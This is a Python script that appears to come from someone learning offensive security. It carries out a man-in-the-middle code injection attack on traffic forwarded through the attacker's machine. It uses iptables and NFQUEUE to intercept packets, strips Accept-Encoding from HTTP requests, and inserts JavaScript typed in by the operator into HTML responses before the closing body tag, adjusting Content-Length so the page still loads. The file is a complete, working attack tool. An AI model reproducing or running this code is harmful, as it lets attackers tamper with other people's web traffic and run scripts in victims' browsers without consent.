#!/sur/bin/env python3

import subprocess
import netfilterqueue
import scapy.all as scapy
import re

# Modify route: we'll modify the FORWARD chain and trap its content in NFQUEUE O
# iptables -I FORWARD -j NFQUEUE --queue-num 0
from scapy.layers.inet import IP, TCP

subprocess.run('iptables --flush', shell=True)
subprocess.run('iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
# Enabling port forwarding
subprocess.run('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)


def set_load(packet, load):
    # Now we'll set the url from which the fake file will be downloaded
    packet[scapy.Raw].load = load
    # Now we must remove the len in the IP layer and the chksum in IP and TCP layers
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            # Python might fail to convert some bytes to a string if the packet
            # contains carachters that cannot be converted to a string. This would
            # mean that this characters are not html code, so we'll do a try except
            # to deal with this issue so only the packet with html will be modified
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] Request")
                # Now we'll replace the encoding line with nothing so the server
                # will think that we don't understand any kind of encoding and
                # it will send the plain html code
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] Response")
                # print(scapy_packet.show())
                # injection_code = "<script>alert('IRONJAQUEEEERRRRR Pringao, te han jaqueao');</script>"
                # We will inject the javascript in the </body> beacause this is a
                # piece of code that every html page has at the end, so we are sure that,
                # not only the code is injected, but also that the web page will be
                # loaded with no delays, as our code is injected at the end
                load = load.replace("</body>", injection_code + "</body>")
                """
                Content-Length specifies the size of the response, the size of the html
                code we are going to receive. If we inject code it will modify the
                size of the page and the connection will be cut with Error 400 Bad Request
                """
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    # print(content_length)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass
    packet.accept()


try:
    injection_code = input("Write the javascript code you want to inject.\nEx.: <script>alert('PRINGAO');</script>\n")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

except KeyboardInterrupt:
    subprocess.run('iptables --flush', shell=True)
    print("[+] Detected  CTRL + C ...... Deleting IP tables..... Please wait.\n")